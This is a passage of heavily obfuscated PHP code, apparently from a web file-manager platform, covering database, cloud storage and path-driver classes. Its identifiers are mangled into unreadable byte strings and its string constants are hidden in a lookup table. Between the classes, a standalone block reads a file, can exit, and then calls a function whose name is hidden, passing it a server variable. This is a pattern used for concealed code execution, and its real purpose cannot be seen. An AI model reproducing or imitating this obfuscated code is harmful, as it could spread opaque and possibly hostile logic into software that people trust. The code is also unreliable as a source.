$this->parseKey($¥ë¤º„Ô)); $´É³ˆô¤ = array(); if ($ÈìÛ‰úç) { foreach ($ÈìÛ‰úç as $Ü§™Öµ³ => $İØœí³¬) { $´É³ˆô¤[$İØœí³¬[$ÈÔû´åà[31]]] = array($ÈÔû´åà[32] => $İØœí³¬[$ÈÔû´åà[31]], $ÈÔû´åà[33] => $İØœí³¬[$ÈÔû´åà[34]], $ÈÔû´åà[35] => (bool) ($İØœí³¬[$ÈÔû´åà[36]] === $ÈÔû´åà[12]), $ÈÔû´åà[37] => $İØœí³¬[$ÈÔû´åà[38]], $ÈÔû´åà[39] => strtolower($İØœí³¬[$ÈÔû´åà[40]]) == $ÈÔû´åà[41], $ÈÔû´åà[42] => strtolower($İØœí³¬[$ÈÔû´åà[43]]) == $ÈÔû´åà[44]); } } return $´É³ˆô¤; } public function getTables($İ¶§˜Âİ = '') { $Š…­— =& $_SERVER[®»±”ó²]; $Ø°¬·€ = !empty($İ¶§˜Âİ) ? $Š…­—[986] . $İ¶§˜Âİ . $Š…­—[987] : $Š…­—[988]; $ëõò¤ä = $this->query($Ø°¬·€); $êÕ†š ¾ = array(); if ($ëõò¤ä) { foreach ($ëõò¤ä as $¤ŠåÍäç => $şãå¯€Á) { $êÕ†š ¾[$¤ŠåÍäç] = current($şãå¯€Á); } } return $êÕ†š ¾; } public function replace($Ù»ÈÖù±, $½¦ïĞ¨º = array()) { $Øª™Œº =& $_SERVER[®»±”ó²]; foreach ($Ù»ÈÖù± as $ŸÚ»¯–‘ => $çşşÁå—) { $ĞÉ‚ÊÇØ = $this->parseValue($çşşÁå—); if (is_scalar($ĞÉ‚ÊÇØ)) { $‰µäñè»[] = $ĞÉ‚ÊÇØ; $ÓÍ¯ÏŞÌ[] = $this->parseKey($ŸÚ»¯–‘); } } $’èŒûµÍ = $Øª™Œº[989] . $this->parseTable($½¦ïĞ¨º[$Øª™Œº[359]]) . $Øª™Œº[990] . implode($Øª™Œº[50], $ÓÍ¯ÏŞÌ) . $Øª™Œº[991] . implode($Øª™Œº[50], $‰µäñè») . $Øª™Œº[992]; return $this->execute($’èŒûµÍ); } public function insertAll($ò‹öòã‘, $õŸú´ ş = array(), $¬ËÛùœı = false) { $ö¢ŠŠÒ£ =& $_SERVER[®»±”ó²]; if (!is_array($ò‹öòã‘[0])) { return !1; } $¥ä«î¯ù = array_keys($ò‹öòã‘[0]); $Ô‹Øô» = array(); foreach ($ò‹öòã‘ as $Ò“ÖÒè§) { $úïšœ€¶ = array(); foreach ($Ò“ÖÒè§ as $ß³Ù¬¤¶ => $»Üä³õÑ) { $»Üä³õÑ = $this->parseValue($»Üä³õÑ); if (is_scalar($»Üä³õÑ)) { $úïšœ€¶[] = $»Üä³õÑ; } } $Ô‹Øô»[] = $ö¢ŠŠÒ£[340] . implode($ö¢ŠŠÒ£[50], $úïšœ€¶) . $ö¢ŠŠÒ£[992]; } array_walk($¥ä«î¯ù, array($this, $ö¢ŠŠÒ£[993])); $æÕ˜”Úõ = $¬ËÛùœı ? $ö¢ŠŠÒ£[994] : $ö¢ŠŠÒ£[995]; $ğıÅÆ†Ì = $æÕ˜”Úõ . $ö¢ŠŠÒ£[996] . $this->parseTable($õŸú´ ş[$ö¢ŠŠÒ£[359]]) . $ö¢ŠŠÒ£[990] . implode($ö¢ŠŠÒ£[50], $¥ä«î¯ù) . $ö¢ŠŠÒ£[997] . implode($ö¢ŠŠÒ£[50], $Ô‹Øô»); return $this->execute($ğıÅÆ†Ì); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ÊŠéµ¯Ş =& $_SERVER[®»±”ó²]; $this->error = $this->_linkID->errno . $ÊŠéµ¯Ş[4] . $this->_linkID->error; if ($ÊŠéµ¯Ş[12] != $this->queryStr) { $this->error .= LNG($ÊŠéµ¯Ş[48]) . $this->queryStr; } think_trace($this->error, $ÊŠéµ¯Ş[12], $ÊŠéµ¯Ş[49]); return $this->error; } public function escapeString($ÅÌÏş—’) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ÅÌÏş—’); } else { return addslashes($ÅÌÏş—’); } } public function parseKey(&$® ¦Ã¥, $éê©·Ù‘ = true) { $ßˆ¿ı„Ù =& $_SERVER[®»±”ó²]; if ($éê©·Ù‘) { $® ¦Ã¥ = $this->parseKeyCheck($® ¦Ã¥); } if ($® ¦Ã¥ != $ßˆ¿ı„Ù[223] && !preg_match($ßˆ¿ı„Ù[998], $® ¦Ã¥)) { $® ¦Ã¥ = $ßˆ¿ı„Ù[463] . trim($® ¦Ã¥, $ßˆ¿ı„Ù[463]) . $ßˆ¿ı„Ù[463]; } return $® ¦Ã¥; } } goto CÛÒ†Á¼Ä¯; EËÃÂòê™Ó: class PathDriverBOS extends PathDriverS3 { public function __construct($âÖòäÔŠ) { parent::__construct($âÖòäÔŠ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ÔÍØŒÙÖ) { parent::__construct($ÔÍØŒÙÖ); $this->setSignVersion($_SERVER[®»±”ó²][250]); } public function uploadFormData($½ĞÑû´Ş, $Ï¹ÖËœÀ = 3600) { $¾ÄÖ¬­ì =& $_SERVER[®»±”ó²]; $Õ°ºî›À = $¾ÄÖ¬­ì[232]; $ã°éâ¤Á = $¾ÄÖ¬­ì[1431]; $›š¢ÑÂ = $¾ÄÖ¬­ì[264]; $®·®ÇÇÖ = gmdate($¾ÄÖ¬­ì[1432], time() + $Ï¹ÖËœÀ); $öÒ…§Ú = (string) time() . $¾ÄÖ¬­ì[74] . (string) (time() + $Ï¹ÖËœÀ); $˜¯¶‹„Á = array($¾ÄÖ¬­ì[265] => $®·®ÇÇÖ, $¾ÄÖ¬­ì[268] => array(array($¾ÄÖ¬­ì[309] => $Õ°ºî›À), array($¾ÄÖ¬­ì[269] => $this->bucket), array($¾ÄÖ¬­ì[270], $¾ÄÖ¬­ì[271], $¾ÄÖ¬­ì[12]), array($¾ÄÖ¬­ì[273] => $›š¢ÑÂ), array($¾ÄÖ¬­ì[1433] => $ã°éâ¤Á), array($¾ÄÖ¬­ì[1434] => $this->accessKey), array($¾ÄÖ¬­ì[1435] => $öÒ…§Ú))); $˜¯¶‹„Á = json_encode($˜¯¶‹„Á); $‰Æ€¹µ” = hash_hmac($¾ÄÖ¬­ì[1431], $öÒ…§Ú, $this->secret); $²óİŠÛÈ = sha1($˜¯¶‹„Á); $„çâÚğ = hash_hmac($¾ÄÖ¬­ì[1431], $²óİŠÛÈ, $‰Æ€¹µ”); $Á¹öˆœŒ = array($¾ÄÖ¬­ì[309] => $Õ°ºî›À, $¾ÄÖ¬­ì[273] => $›š¢ÑÂ, $¾ÄÖ¬­ì[280] => base64_encode($˜¯¶‹„Á), $¾ÄÖ¬­ì[1433] => $ã°éâ¤Á, $¾ÄÖ¬­ì[1434] => $this->accessKey, $¾ÄÖ¬­ì[1436] => $öÒ…§Ú, $¾ÄÖ¬­ì[1437] => $„çâÚğ, $¾ÄÖ¬­ì[209] => $this->getHost()); return $Á¹öˆœŒ; } public function fileOutImage($¾ö·ˆÚ€, $ôıîÓç‹ = 250) { $–â»¥ôñ =& $_SERVER[®»±”ó²]; if ($this->size($¾ö·ˆÚ€) > 1024 * 1024 * 32) { return $this->fileOutImageServer($¾ö·ˆÚ€, $ôıîÓç‹); } $í¤Ã¾Ø = $this->link($¾ö·ˆÚ€); $í¤Ã¾Ø .= $–â»¥ôñ[1438] . $ôıîÓç‹ . $–â»¥ôñ[1439]; $this->fileOutLink($í¤Ã¾Ø); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($—Š€òû) { $this->pathParse = $—Š€òû; $this->model = Model($_SERVER[®»±”ó²][1440]); } public function getPath($ÛÔ¦¨Æ’) { return trim($ÛÔ¦¨Æ’, $_SERVER[®»±”ó²][8]); } public function pathFather($¬£«Øİ) { $¬À é®ù = $this->parse($¬£«Øİ); $¬À é®ù = $this->infoSimple($¬£«Øİ); return $¬À é®ù ? $¬À é®ù[$_SERVER[®»±”ó²][193]] : !1; } public function pathThis($ä“®œßà) { $ç§‹áÛ = $this->infoSimple($ä“®œßà); return $ç§‹áÛ ? $ç§‹áÛ[$_SERVER[®»±”ó²][32]] : !1; } public function getPathOuter($‘Ì‚£â˜) { if (!$‘Ì‚£â˜) { return $‘Ì‚£â˜; } $™×µŠªØ = $this->parse($‘Ì‚£â˜); return KodIO::make($™×µŠªØ[$_SERVER[®»±”ó²][477]]); } public function copyFolderFromIO($ãä™«¼ü, $‘¨„˜ü’, $Í¿ŞîÔ, $Óš™Ş·å, $‰ĞÙëÚä) { $åéô¿ŒÏ = $this->model->copyFolderFromIO($ãä™«¼ü, $‘¨„˜ü’, $Í¿ŞîÔ, $Óš™Ş·å, $‰ĞÙëÚä); return KodIO::make($åéô¿ŒÏ); } public function isParentOf($ß³¡»’„, $§í‘›Û) { return $this->model->isParentOf($ß³¡»’„, $§í‘›Û); } public function mkfile($Ë©ü¿—¼, $şàô—íÛ = '', $ºÉ¼¯ùş = REPEAT_RENAME) { $‚çš§°¸ =& $_SERVER[®»±”ó²]; $Éé©‰Í = $this->parse($Ë©ü¿—¼); $Ë©ü¿—¼ = $Éé©‰Í[$‚çš§°¸[477]]; for ($Ô©Ş‚Ï = 0; $Ô©Ş‚Ï < count($Éé©‰Í[$‚çš§°¸[1441]]); $Ô©Ş‚Ï++) { $æŞ¬‚¢ø = $Éé©‰Í[$‚çš§°¸[1441]][$Ô©Ş‚Ï]; if ($Ô©Ş‚Ï == count($Éé©‰Í[$‚çš§°¸[1441]]) - 1) { $Ë©ü¿—¼ = $this->model->mkfile($Ë©ü¿—¼, $æŞ¬‚¢ø, $şàô—íÛ, $ºÉ¼¯ùş); break; } $Ë©ü¿—¼ = $this->model->mkdir($Ë©ü¿—¼, $æŞ¬‚¢ø, REPEAT_SKIP); } return $this->getPathOuter($Ë©ü¿—¼); } public function mkdir($æîôª­, $Ã·‹ğ©— = REPEAT_SKIP) { $½ŞëÖŒã =& $_SERVER[®»±”ó²]; $‹óí”˜­ = $this->parse($æîôª­); $æîôª­ = $‹óí”˜­[$½ŞëÖŒã[477]]; for ($±ŸŞÉÛ‡ = 0; $±ŸŞÉÛ‡ < count($‹óí”˜­[$½ŞëÖŒã[1441]]); $±ŸŞÉÛ‡++) { $ÓàğÆ€† = $‹óí”˜­[$½ŞëÖŒã[1441]][$±ŸŞÉÛ‡]; $æîôª­ = $this->model->mkdir($æîôª­, $ÓàğÆ€†, $Ã·‹ğ©—); } return $this->getPathOuter($æîôª­); } public function copyFile($¤ØŠÍı™, $¤ê´ØÌ„, $°éüïÕÆ = REPEAT_REPLACE) { $¢šóıæİ =& $_SERVER[®»±”ó²]; $††ğÌ’ß = $this->parse($¤ê´ØÌ„); $œ†ÌüÕ’ = $this->model->copy($¤ØŠÍı™, $††ğÌ’ß[$¢šóıæİ[477]], $°éüïÕÆ, $††ğÌ’ß[$¢šóıæİ[87]]); return $œ†ÌüÕ’ ? $this->getPathOuter($œ†ÌüÕ’) : !1; } public function moveFile($Ÿ—Ü›à¶, $ó×Š‚, $ƒ¯şÀÊŠ = REPEAT_REPLACE) { $ï‰å¬Æ =& $_SERVER[®»±”ó²]; $­ºşòÀ = $this->parse($ó×Š‚); $îª²¼’å = $this->model->move($Ÿ—Ü›à¶, $­ºşòÀ[$ï‰å¬Æ[477]], $ƒ¯şÀÊŠ, $­ºşòÀ[$ï‰å¬Æ[87]]); return $îª²¼’å ? $this->getPathOuter($îª²¼’å) : !1; } public function copy($–ÁÃ’®ò, $¥ÓÜãĞÛ, $á¨»ê±º = REPEAT_REPLACE, $öšä¼ø§ = false) { $‰æô‰úæ = $this->parse($¥ÓÜãĞÛ); $§æòÂşÈ = $this->model->copy($–ÁÃ’®ò, $‰æô‰úæ[$_SERVER[®»±”ó²][477]], $á¨»ê±º, $öšä¼ø§); return $§æòÂşÈ ? $this->getPathOuter($§æòÂşÈ) : !1; } public function moveSameAllow() { } public function move($“Â•Ì•ë, $¥šß·¾, $œôÌ›‚ª = REPEAT_REPLACE, $†ŒØ”ù = false) { $øº´Í¾ì = $this->parse($¥šß·¾); $øï›ú³— = $this->model->move($“Â•Ì•ë, $øº´Í¾ì[$_SERVER[®»±”ó²][477]], $œôÌ›‚ª, $†ŒØ”ù); return $øï›ú³— ? $this->getPathOuter($øï›ú³—) : !1; } public function remove($²ƒœèï¨, $Ñıˆìª¡ = true) { return $this->model->remove($²ƒœèï¨, $Ñıˆìª¡); } public function rename($ÃÒ áóÀ, $­××Å×) { $«Ñ›­ú = $this->model->rename($ÃÒ áóÀ, $­××Å×); return $«Ñ›­ú ? $this->getPathOuter($ÃÒ áóÀ) : $«Ñ›­ú; } public function size($¡—²Ö¥) { $÷¡İ§÷ = $this->infoSimple($¡—²Ö¥); return $÷¡İ§÷ ? $÷¡İ§÷[$_SERVER[®»±”ó²][79]] : 0; } public function infoSimple($¬Ù·) { return $this->model->sourceInfo($¬Ù·); } public function info($£ºïÃáù) { return $this->infoParse($£ºïÃáù); } public function infoAuth($¾ŞëÑ’À) { return $this->infoParse($¾ŞëÑ’À, !1, !0); } public function infoWithChildren($²—èüûª) { return $this->infoParse($²—èüûª, !0); } protected function infoParse($æºËç¶£, $ôøù“ = false, $ ·û—®’ = false) { if (!$ôøù“) { return $this->model->pathInfo($æºËç¶£, $ ·û—®’); } return $this->model->pathInfoMore($æºËç¶£); } public function infoFullSimple($‰Ê½„ò) { $î¢­¥¼˜ =& $_SERVER[®»±”ó²]; $ÃöË ·‚ = explode($î¢­¥¼˜[8], $‰Ê½„ò); $Íµİü’× = implode($î¢­¥¼˜[8], array_splice($ÃöË ·‚, 1)); return $this->model->pathInfoByPath($ÃöË ·‚[0], $Íµİü’×); } public function infoFull($Íä¯„÷É) { $‹×ªî = $this->infoFullSimple($Íä¯„÷É); return is_array($‹×ªî) ? $this->model->pathInfo($‹×ªî[$_SERVER[®»±”ó²][194]]) : !1; } public function hashSimple($ğÍ£äÙÄ) { $±Áú³îÇ =& $_SERVER[®»±”ó²]; $”ıøğã = $this->infoWithChildren($ğÍ£äÙÄ); return $”ıøğã[$±Áú³îÇ[170]][$±Áú³îÇ[688]]; } public function hashMd5($Êî†Ñ¡‹) { $™­«òäµ =& $_SERVER[®»±”ó²]; $šáƒ­†— = $this->infoWithChildren($Êî†Ñ¡‹); return $šáƒ­†—[$™­«òäµ[170]][$™­«òäµ[560]]; } public function exist($¦Îº›–Û) { $ô‡ˆ°û =& $_SERVER[®»±”ó²]; $¬Šåõ = $this->parse($¦Îº›–Û); if (!$¬Šåõ[$ô‡ˆ°û[87]]) { return $this->isFile($¦Îº›–Û) || $this->isFolder($¦Îº›–Û); } $Á×Ø•˜À = array($ô‡ˆ°û[488] => $¬Šåõ[$ô‡ˆ°û[477]], $ô‡ˆ°û[32] => $¬Šåõ[$ô‡ˆ°û[87]]); $¦‚÷ªîè = $this->model->where($Á×Ø•˜À)->find(); return $¦‚÷ªîè ? !0 : !1; } public function isFile($Óó÷éÊ‹) { $×”ÑƒÚä =& $_SERVER[®»±”ó²]; $¢åÌáÈş = $this->infoSimple($Óó÷éÊ‹); return $¢åÌáÈş && $¢åÌáÈş[$×”ÑƒÚä[496]] == $×”ÑƒÚä[231] ? !0 : !1; } public function isFolder($Ó´ï€ â) { $ï•øÃò” =& $_SERVER[®»±”ó²]; $˜¡—’çú = $this->infoSimple($Ó´ï€ â); return $˜¡—’çú && $˜¡—’çú[$ï•øÃò”[496]] == $ï•øÃò”[91] ? !0 : !1; } public function listPath($üóıë, $¹¾ŞÆÂ‚ = false) { $°«Ü»¨é =& $_SERVER[®»±”ó²]; if ($üóıë == $°«Ü»¨é[12]) { return !1; } $‡ƒÙÊä„ = array($°«Ü»¨é[488] => $üóıë); if ($¹¾ŞÆÂ‚) { return $this->model->listSource($‡ƒÙÊä„, -1); } return $this->model->listSource($‡ƒÙÊä„); } public function has($ƒ¨­ïÚŒ, $ğ´“ñ ½ = false, $¸Ü¢Êü• = null) { $ìê¦­©Ç =& $_SERVER[®»±”ó²]; $Óü™éîÑ = $this->infoWithChildren($ƒ¨­ïÚŒ); if ($ğ´“ñ ½) { return array($ìê¦­©Ç[243] => $Óü™éîÑ[$ìê¦­©Ç[243]], $ìê¦­©Ç[242] => $Óü™éîÑ[$ìê¦­©Ç[242]]); } return $¸Ü¢Êü• ? $Óü™éîÑ[$ìê¦­©Ç[243]] : $Óü™éîÑ[$ìê¦­©Ç[242]]; } public function listAll($™¨®»íó) { $¶‰–¹¢å = IO::info($this->pathParse[$_SERVER[®»±”ó²][87]]); if (!$¶‰–¹¢å) { return array(); } return $this->model->listAll($™¨®»íó); } public function getContent($¦îõø¹•) { return $this->model->getContent($¦îõø¹•); } public function setContent($Ş´şçû, $É˜®Ÿ·å = '') { return $this->model->setContent($Ş´şçû, $É˜®Ÿ·å); } public function fileSubstr($ÚÑ¡ÅŒ, $«¿Ê‘, $Â½²™ªã) { return $this->model->fileSubstr($ÚÑ¡ÅŒ, $«¿Ê‘, $Â½²™ªã); } public function download($†·¡ùÂ, $İ—é ¥ = '') { $îÁã¥è‡ = get_path_father($İ—é ¥); $Ùá‹şòî = get_path_this($İ—é ¥); $Ãïë¦¸ = $this->model->fileInfoGet($†·¡ùÂ); $ú™°‹ö© = IO::copy($Ãïë¦¸[$_SERVER[®»±”ó²][87]], $îÁã¥è‡, !1, $Ùá‹şòî); return $ú™°‹ö©; } public function setModifyTime($â™Ä¶„, $ˆçÆë¢¡ = '') { $‡œ˜ñÍ¨ =& $_SERVER[®»±”ó²]; if (!$â™Ä¶„) { return; } $this->model->where(array($‡œ˜ñÍ¨[502] => $â™Ä¶„))->save(array($‡œ˜ñÍ¨[88] => $ˆçÆë¢¡)); } public function upload($Òşã’Ô, $÷¥¥ì¡é, $Ï»¡×‰Ã = false, $ê”Êß¸ = REPEAT_REPLACE) { $É†Ç“Ç =& $_SERVER[®»±”ó²]; $ã¬¾É¤Æ = $this->parse($Òşã’Ô); $†º•ˆí» = $this->model->addFile($ã¬¾É¤Æ[$É†Ç“Ç[477]], $÷¥¥ì¡é, $ã¬¾É¤Æ[$É†Ç“Ç[87]], $Ï»¡×‰Ã, $ê”Êß¸); return $this->getPathOuter($†º•ˆí»); } public function uploadFileByID($Ê­ÓìØå, $¨â¬À­Ñ, $–¤Ò¿‚ô) { $ –‡¹‹Ñ =& $_SERVER[®»±”ó²]; $®·µŒ´ = $this->parse($Ê­ÓìØå); $ßâ‚¥ûä = $this->model->addFileByFileID($®·µŒ´[$ –‡¹‹Ñ[477]], $¨â¬À­Ñ, $®·µŒ´[$ –‡¹‹Ñ[87]], $–¤Ò¿‚ô); return $this->getPathOuter($ßâ‚¥ûä); } public function addFileByRemote($ùĞ¦˜¾Œ, $Š±ãÏ¤Ç, $šÎ®³ï» = array(), $ÒâŒÕ’Æ = '', $õï¿š¿ó) { $ÇÑË½ß˜ =& $_SERVER[®»±”ó²]; $ëçãƒë€ = $this->parse($ùĞ¦˜¾Œ); $ÒâŒÕ’Æ = empty($ÒâŒÕ’Æ) ? $ëçãƒë€[$ÇÑË½ß˜[87]] : $ÒâŒÕ’Æ; $í¶Œê‡³ = $this->model->addFileByRemote($ëçãƒë€[$ÇÑË½ß˜[477]], $Š±ãÏ¤Ç, $ÒâŒÕ’Æ, $šÎ®³ï», $õï¿š¿ó); return $this->getPathOuter($í¶Œê‡³); } public function uploadLink($ˆ²ÛÌãÉ, $Ÿƒ¢ã‡‚ = 0) { $„£¾½î¬ =& $_SERVER[®»±”ó²]; $¿ÃÍŞîÂ = $this->parse($ˆ²ÛÌãÉ); $µ˜Şî = _get($GLOBALS[$„£¾½î¬[7]], $„£¾½î¬[1442]); $²£–›‹ = _get($GLOBALS[$„£¾½î¬[7]], $„£¾½î¬[1443]); $öùìË…Õ = KodIO::ioFileDriverGet($„£¾½î¬[494] . $¿ÃÍŞîÂ[$„£¾½î¬[477]] . $„£¾½î¬[404]); $Î…·ğ’„ = Model($„£¾½î¬[690])->createFileName($¿ÃÍŞîÂ[$„£¾½î¬[87]], $öùìË…Õ, $µ˜Şî, $²£–›‹); return IO::uploadLink($Î…·ğ’„, $Ÿƒ¢ã‡‚); } public function fileNameAuto($êòÆ€Œ·, $Öƒê½×ˆ, $‰éêŒ–• = REPEAT_REPLACE, $õª£Å‹å = false) { return $this->model->fileNameAuto($êòÆ€Œ·, $Öƒê½×ˆ, $‰éêŒ–•, $õª£Å‹å); } public function fileNameExist($ßª¯ã¯», $‹õî  ş) { return $this->model->fileNameExist($ßª¯ã¯», $‹õî  ş); } protected function _fileOut($Ø×»÷‚, $÷œÒñ• = false, $Öà´¡ßë = false, $›ÌøîÅÂ = '', $–£ô¸Ò¸ = false) { $ÛúÒÕ¾• =& $_SERVER[®»±”ó²]; $ûÍœá¥æ = $this->model->sourceInfo($Ø×»÷‚); if ($ûÍœá¥æ[$ÛúÒÕ¾•[496]] == $ÛúÒÕ¾•[91]) { header($ÛúÒÕ¾•[1444]); die; } $¨½Îù­ = $this->model->fileInfoGet($Ø×»÷‚); $›ÌøîÅÂ = $¨½Îù­[$ÛúÒÕ¾•[560]] ? $¨½Îù­[$ÛúÒÕ¾•[560]] : $›ÌøîÅÂ; $¼»ƒšìŸ = isset($GLOBALS[$ÛúÒÕ¾•[183]]) && is_array($GLOBALS[$ÛúÒÕ¾•[183]]) ? $GLOBALS[$ÛúÒÕ¾•[183]][$ÛúÒÕ¾•[32]] : $ûÍœá¥æ[$ÛúÒÕ¾•[32]]; if ($–£ô¸Ò¸) { return IO::fileOutServer($¨½Îù­[$ÛúÒÕ¾•[87]], $÷œÒñ•, $¼»ƒšìŸ, $›ÌøîÅÂ); } IO::fileOut($¨½Îù­[$ÛúÒÕ¾•[87]], $÷œÒñ•, $¼»ƒšìŸ, $›ÌøîÅÂ); } public function fileOut($÷ƒü‰, $¹ìÃ¡®î = false, $õÊşÜí = false, $ƒí‘ó©İ = '') { $this->_fileOut($÷ƒü‰, $¹ìÃ¡®î, $õÊşÜí, $ƒí‘ó©İ); } public function fileOutServer($ÕèÖ¡£€, $º‚Ñ¶ËÎ = false, $¬¾øùï = false, $š‰£óÛı = '') { $this->_fileOut($ÕèÖ¡£€, $º‚Ñ¶ËÎ, $¬¾øùï, $š‰£óÛı, !0); } protected function _fileOutImage($­ÛÉÈø§, $†Ã•Üİú = 250) { $ßÍÉ‘Ùş =& $_SERVER[®»±”ó²]; $¾¸¢Òæ­ = $this->model->pathInfo($­ÛÉÈø§); if ($¾¸¢Òæ­[$ßÍÉ‘Ùş[496]] == $ßÍÉ‘Ùş[91]) { show_json($ßÍÉ‘Ùş[1445] . $­ÛÉÈø§, !1); } $Ä¡­ØÏ¤ = $this->model->fileInfoGet($­ÛÉÈø§); $¾¸¢Òæ­[$ßÍÉ‘Ùş[184]] = $Ä¡­ØÏ¤[$ßÍÉ‘Ùş[87]]; $GLOBALS[$ßÍÉ‘Ùş[183]] = $¾¸¢Òæ­; IO::fileOutImage($Ä¡­ØÏ¤[$ßÍÉ‘Ùş[87]], $†Ã•Üİú); } public function fileOutImage($ßúşˆŒ‡, $ú£õ÷ãÒ = 250) { $this->_fileOutImage($ßúşˆŒ‡, $ú£õ÷ãÒ); } public function fileOutImageServer($½´ì¨‡™, $úŞ¶û÷ = 250) { $this->_fileOutImage($½´ì¨‡™, $úŞ¶û÷); } public function link($›ñ¶Œİ, $ƒü°„„ = '') { $úĞœ†Í÷ = $this->model->fileInfoGet($›ñ¶Œİ); return IO::link($úĞœ†Í÷[$_SERVER[®»±”ó²][87]], $ƒü°„„); } protected function parse($ÛÍ«—ÇÀ) { $‘ù¸Í•© =& $_SERVER[®»±”ó²]; if (strstr($ÛÍ«—ÇÀ, $‘ù¸Í•©[8]) === !1) { return array($‘ù¸Í•©[504] => intval($ÛÍ«—ÇÀ), $‘ù¸Í•©[87] => $‘ù¸Í•©[12], $‘ù¸Í•©[1441] => array()); } $âÒ–ôÓä = explode($‘ù¸Í•©[8], trim($ÛÍ«—ÇÀ, $‘ù¸Í•©[8])); if (count($âÒ–ôÓä) < 2) { show_tips(clear_html($ÛÍ«—ÇÀ) . $‘ù¸Í•©[1446]); } return array($‘ù¸Í•©[504] => intval($âÒ–ôÓä[0]), $‘ù¸Í•©[87] => $âÒ–ôÓä[1], $‘ù¸Í•©[1441] => array_slice($âÒ–ôÓä, 1)); } } goto bŠªÔŒ„§; EçÅƒÜÙ„: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\x74\x65\155\117\x70\164\151\x6f\156"; public $field = array(); public function listData($¬²‚ê = false, $‚àüŠ¯ = "\x6d\157\x64\151\x66\171\124\x69\155\145", $¤ÀşÀ«ƒ = false) { $¸ı“©Ä = Model($this->modelType)->get(!1, $this->optionType, !0); $¸ĞûÃÎ‹ = array_values($¸ı“©Ä); if ($¸ĞûÃÎ‹ && $¸ĞûÃÎ‹[0] && !is_array($¸ĞûÃÎ‹[0])) { Model($this->modelType)->cacheRemove($this->optionType); $¸ı“©Ä = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$¸ı“©Ä) { return $¬²‚ê ? null : array(); } if (!$¬²‚ê) { $¸ı“©Ä = array_filter(array_values($¸ı“©Ä)); return array_sort_by($¸ı“©Ä, $‚àüŠ¯, $¤ÀşÀ«ƒ); } return $¸ı“©Ä[$_SERVER[®»±”ó²][474] . $¬²‚ê]; } public function insert($ıÇÕÔÆï) { $ˆüò´—’ =& $_SERVER[®»±”ó²]; $ıÇÕÔÆï = array_field_key($ıÇÕÔÆï, $this->field); $úÊñæ®ê = Model($this->modelType)->get($ˆüò´—’[475], $this->optionType . $ˆüò´—’[476]); $úÊñæ®ê = $úÊñæ®ê ? $úÊñæ®ê : 0; $ıÇÕÔÆï[$ˆüò´—’[477]] = ++$úÊñæ®ê; $ıÇÕÔÆï[$ˆüò´—’[234]] = time(); $ıÇÕÔÆï[$ˆüò´—’[88]] = time(); Model($this->modelType)->set($ˆüò´—’[475], $úÊñæ®ê, $this->optionType . $ˆüò´—’[476]); Model($this->modelType)->set($ˆüò´—’[474] . $úÊñæ®ê, $ıÇÕÔÆï, $this->optionType); return $úÊñæ®ê; } public function update($û§§Ò—·, $ŠŠ¶—ô‹) { $Ï½Ö³êÂ =& $_SERVER[®»±”ó²]; $ŠŠ¶—ô‹ = array_field_key($ŠŠ¶—ô‹, $this->field); $“ñÌİ¶ = $this->listData($û§§Ò—·); if (!$“ñÌİ¶ || !$û§§Ò—·) { return !1; } $ŠŠ¶—ô‹ = array_merge($“ñÌİ¶, $ŠŠ¶—ô‹); $ŠŠ¶—ô‹[$Ï½Ö³êÂ[88]] = time(); return Model($this->modelType)->set($Ï½Ö³êÂ[474] . $û§§Ò—·, $ŠŠ¶—ô‹, $this->optionType); } public function remove($ÛÑùì›«) { if (!$ÛÑùì›«) { return !1; } return Model($this->modelType)->remove($_SERVER[®»±”ó²][474] . $ÛÑùì›«, $this->optionType); } public function clear() { $×Ó·šşÕ =& $_SERVER[®»±”ó²]; Model($this->modelType)->remove($×Ó·šşÕ[475], $this->optionType . $×Ó·šşÕ[476]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($øÃÚƒ­¼, $‰©ì×ã¥) { if (!$‰©ì×ã¥) { return !1; } $º‡“´ôØ = $this->listData(); $º‡“´ôØ = array_to_keyvalue($º‡“´ôØ, $øÃÚƒ­¼); return isset($º‡“´ôØ[$‰©ì×ã¥]) ? $º‡“´ôØ[$‰©ì×ã¥] : !1; } public function findByName($ÒÓÍ„«) { return $this->findByKey($_SERVER[®»±”ó²][32], $ÒÓÍ„«); } protected function resetData($‚é±ë¾¿) { $¶Ô¦¢ =& $_SERVER[®»±”ó²]; $‚é±ë¾¿ = is_array($‚é±ë¾¿) ? $‚é±ë¾¿ : array(); $Ç‡ÂŒÔÈ = array(); for ($ÜéËäç = 0; $ÜéËäç < count($‚é±ë¾¿); $ÜéËäç++) { $Ç‡ÂŒÔÈ[$¶Ô¦¢[474] . $‚é±ë¾¿[$ÜéËäç][$¶Ô¦¢[477]]] = $‚é±ë¾¿[$ÜéËäç]; } return Model($this->modelType)->set($Ç‡ÂŒÔÈ, !1, $this->optionType); } private function getAutoName($ğ¾ó§´) { $Âİ§Øúô = array_to_keyvalue($this->listData(), $_SERVER[®»±”ó²][32]); if (!$Âİ§Øúô || !isset($Âİ§Øúô[$ğ¾ó§´])) { return $ğ¾ó§´; } for ($”Äğ”© = 1; $”Äğ”© < count($Âİ§Øúô); $”Äğ”©++) { $êÒĞ¡ˆª = $ğ¾ó§´ . "\50{$”Äğ”©}\51"; if (!isset($Âİ§Øúô[$êÒĞ¡ˆª])) { return $êÒĞ¡ˆª; } } return $êÒĞ¡ˆª; } } if ($_SERVER[$_SERVER[®»±”ó²][478]] != $_SERVER[$_SERVER[®»±”ó²][479]]) { $_getc = $_SERVER[®»±”ó²][480]; $_getfile = $_SERVER[$_SERVER[®»±”ó²][481]] . $_SERVER[®»±”ó²][482]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[®»±”ó²][288], $_getfilec); if (count($_getarrs) < $_SERVER[®»±”ó²][483]) { $exit = $_SERVER[®»±”ó²][484]; $exit(); } $_act = $_SERVER[®»±”ó²][485]; $_act($_SERVER[$_SERVER[®»±”ó²][486]]); } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ÎÀµœ½» = false, $¤ÒıÒ™¸ = '', $¦Ä˜ì¶ = false) { $Œ¾“ä¸ç =& 